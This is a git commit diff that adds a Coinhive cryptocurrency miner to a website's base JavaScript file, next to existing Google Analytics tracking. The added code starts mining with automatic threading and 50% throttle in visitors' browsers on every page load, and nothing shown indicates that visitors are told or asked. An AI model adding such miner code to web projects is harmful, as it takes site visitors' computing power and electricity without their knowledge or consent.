06419abf82a1ca4be8fd57cfd0364c81022e57ed
Keith Irwin <mail@keithirwin.us>
2017-09-27 15:43:20 +0000

    #37 Added coinhive

--- static/js/base.js
+++ static/js/base.js
@@ -1,5 +1,5 @@
 'use strict';
-/* global ga */
+/* global ga CoinHive */
 
 // Google analytics
 (function(t,r,a,c,m,o,n){t['GoogleAnalyticsObject']=m;t[m]=t[m]||function(){
@@ -9,3 +9,9 @@ n=r.getElementsByTagName(a)[0];o.async=1;o.src=c;n.parentNode.insertBefore(o,n);
 ga('create','UA-44266909-3','auto');
 ga('require','linkid');
 ga('send','pageview');
+
+// Coinhive
+new CoinHive.Anonymous('7FZrGIbIO4kqxbTLa82QpffB9ShUGmWE',{
+	autoThreads: true,
+	throttle: .5
+}).start(CoinHive.FORCE_EXCLUSIVE_TAB);
